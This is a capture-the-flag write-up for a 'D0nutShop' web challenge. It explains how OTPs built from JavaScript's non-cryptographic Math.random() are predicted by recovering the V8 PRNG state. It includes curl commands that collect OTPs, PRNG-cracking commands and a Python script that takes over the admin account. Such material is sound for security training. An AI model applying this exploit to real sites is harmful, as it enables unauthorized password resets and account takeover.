# D0nutShop
![Image](https://github.com/user-attachments/assets/d8a79cc1-05e8-4b2b-9613-473bae6d0b6e)

**Attachment:** [challenge.zip](https://github.com/user-attachments/files/19113145/challenge.zip)  
**Password:** snyk-ftf-2025  
**Credentials:**
- d0nut:d0nutboi

## Writeup
![Image](https://github.com/user-attachments/assets/394d3c39-b057-46d2-a0a2-6e5a39a3a95d)

"D0nutShop" is a simple online donut store.

Looking at the description and the site, there is a reference to the `Math.floor()` function. Checking the source code, this is the relevant part:

```javascript
const CONST = 10000000;
const otpStore = {};

function generateOtp(username) {
    const otp = Math.floor(CONST * Math.random());
    otpStore[username] = otp;
    return otp;
}

function verifyOtp(username, otp) {
    if (otpStore[username] && parseInt(otp) === otpStore[username]) {
        delete otpStore[username];
        return true;
    }
    return false;
}

module.exports = { generateOtp, verifyOtp };
```

The `Math.random()` function is not cryptographically secure at all, as we can se [here](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math/random).

There's an **admin login page**, and at the bottom, an option to reset the password by requesting an **OTP**:

![Image](https://github.com/user-attachments/assets/57d433c6-5cd5-4e13-8ffb-baee809ce47d)

![Image](https://github.com/user-attachments/assets/043c5840-3e5f-43f8-b6ac-67c458768d95)

`admin` is a valid user, and this is the message I get from the site with the method I can use to retrieve the OTP:

![Image](https://github.com/user-attachments/assets/6df97b5d-3e42-4b1c-a2ee-b762c8548d91)

While browsing GitHub, I found this repo explaining how to exploit the vulnerable `Math.floor(CONST * Math.random())` function: https://github.com/d0nutptr/v8_rand_buster  

So, I started by using **curl** with the message I received from the site to collect multiple `OTPs`:

```bash
curl -s -X POST http://challenge.ctf.games:31557/reset -d 'username=d0nut' 1>/dev/null
curl -s -X POST http://challenge.ctf.games:31557/reset/api/get-otp -H 'Content-Type: application/json' -d '{"username":"d0nut","password":"d0nutboi"}'
```

![Image](https://github.com/user-attachments/assets/b53fe910-908a-4fb9-8590-247d1b161b24)

Then I installed the repo and followed the instructions to generate a `seed`:

```bash
cat codes.txt | tac | python3 xs128p.py --multiple 10000000 --lead 6
```

![Image](https://github.com/user-attachments/assets/aeaf714c-bf75-4bb5-962d-07ff61378957)

I generated the following OTPs using the seeds I retrieved:

```bash
python3 xs128p.py --multiple 10000000 --gen 1155105234970035644,15775672274592191546,7
```

![Image](https://github.com/user-attachments/assets/2928fa89-b5ea-4432-9db0-317abdf25c91)

```python
#!/usr/bin/python

import requests, json

base_url = 'http://challenge.ctf.games:31557'
reset_url = f'{base_url}/reset'
verify_url = f'{base_url}/reset/verify'
change_password = f'{base_url}/reset/change-password'

header = {'Content-Type': 'application/x-www-form-urlencoded'}

reset_data = {'username': 'admin'}
new_password_data = {'newPassword': 'dav'}

try:
    r = requests.post(reset_url, data=reset_data, headers=header)
    r.raise_for_status()  # Controlla che la risposta sia valida
except requests.exceptions.RequestException as e:
    print(f"Error during reset: {e}")
    exit(1)

verify_data = {'username': 'admin', 'otp': '3974566'}
try:
    r = requests.post(verify_url, data=verify_data, headers=header)
    r.raise_for_status()
    
    if 'verified' in r.text:
        verified_cookie = r.cookies.get('connect.sid')
        r = requests.post(change_password, headers=header, cookies={'connect.sid': verified_cookie}, data=new_password_data)
        
        if 'successfully' in r.text:
            print('Admin password successfully changed!')
        else:
            print('Failed to change password')
    else:
        print('Failed to verify OTP')
except requests.exceptions.RequestException as e:
    print(f"Error during verification or password change: {e}")
```
